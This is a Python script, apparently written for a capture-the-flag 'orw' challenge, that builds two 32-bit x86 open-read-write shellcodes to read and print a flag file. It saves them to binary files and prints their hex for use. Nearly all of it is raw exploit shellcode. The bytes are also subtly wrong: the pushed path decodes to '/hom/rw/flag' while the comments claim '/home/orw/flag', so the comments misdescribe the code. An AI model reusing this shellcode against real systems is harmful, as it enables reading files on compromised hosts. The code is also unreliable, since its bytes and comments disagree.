#!/usr/bin/env python3

# Simple ORW shellcode - using a different approach

def create_simple_orw():
    # Very simple approach using push instructions
    shellcode = b""
    
    # Clear eax
    shellcode += b"\x31\xc0"              # xor eax, eax
    
    # Push null terminator
    shellcode += b"\x50"                  # push eax
    
    # Push "flag" (reversed for little endian)
    shellcode += b"\x68\x67\x61\x6c\x66"  # push "flag"
    
    # Push "/orw/" (reversed)
    shellcode += b"\x68\x2f\x72\x77\x2f"  # push "/orw/"
    
    # Push "/hom" (reversed)
    shellcode += b"\x68\x2f\x68\x6f\x6d"  # push "/hom"
    
    # Now esp points to "/home/orw/flag\0"
    
    # open syscall
    shellcode += b"\x89\xe3"              # mov ebx, esp (filename)
    shellcode += b"\x31\xc9"              # xor ecx, ecx (O_RDONLY)
    shellcode += b"\x31\xd2"              # xor edx, edx (mode)
    shellcode += b"\xb0\x05"              # mov al, 5 (sys_open)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # read syscall
    shellcode += b"\x89\xc3"              # mov ebx, eax (file descriptor)
    shellcode += b"\x89\xe1"              # mov ecx, esp (buffer)
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x64"              # mov dl, 100 (read 100 bytes)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x03"              # mov al, 3 (sys_read)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # write syscall
    shellcode += b"\x89\xc2"              # mov edx, eax (bytes read)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4 (sys_write)
    shellcode += b"\xb3\x01"              # mov bl, 1 (stdout)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # exit
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax (sys_exit = 1)
    shellcode += b"\xcd\x80"              # int 0x80
    
    return shellcode

def create_jcp_orw():
    # jmp-call-pop version
    shellcode = b""
    
    # jmp to call instruction
    shellcode += b"\xeb\x3a"              # jmp 0x3c
    
    # pop instruction (executed after call)
    shellcode += b"\x5e"                  # pop esi
    
    # null terminate string
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x88\x46\x0e"          # mov [esi+14], al
    
    # open syscall
    shellcode += b"\x89\xf3"              # mov ebx, esi (filename)
    shellcode += b"\x31\xc9"              # xor ecx, ecx (O_RDONLY)
    shellcode += b"\x31\xd2"              # xor edx, edx (mode)
    shellcode += b"\xb0\x05"              # mov al, 5 (sys_open)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # read syscall
    shellcode += b"\x89\xc3"              # mov ebx, eax (fd)
    shellcode += b"\x89\xf1"              # mov ecx, esi (buffer)
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x64"              # mov dl, 100
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x03"              # mov al, 3 (sys_read)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # write syscall
    shellcode += b"\x89\xc2"              # mov edx, eax (bytes read)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4 (sys_write)
    shellcode += b"\xb3\x01"              # mov bl, 1 (stdout)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # exit
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax
    shellcode += b"\xcd\x80"              # int 0x80
    
    # call instruction
    shellcode += b"\xe8\xc1\xff\xff\xff"  # call $-0x3f
    
    # string
    shellcode += b"/home/orw/flag"
    
    return shellcode

def main():
    print("Creating simple ORW shellcodes...")
    
    # Simple push version
    simple = create_simple_orw()
    print(f"Simple ORW: {len(simple)} bytes")
    print(f"Hex: {simple.hex()}")
    
    # JCP version
    jcp = create_jcp_orw()
    print(f"\nJCP ORW: {len(jcp)} bytes")
    print(f"Hex: {jcp.hex()}")
    
    # Write both
    with open('/workspace/orw_challenge/simple_orw.bin', 'wb') as f:
        f.write(simple)
    
    with open('/workspace/orw_challenge/jcp_orw.bin', 'wb') as f:
        f.write(jcp)
    
    print("\nShellcodes written to files")
    
    # Create hex strings for direct use
    print(f"\nSimple hex: {simple.hex()}")
    print(f"JCP hex: {jcp.hex()}")

if __name__ == "__main__":
    main()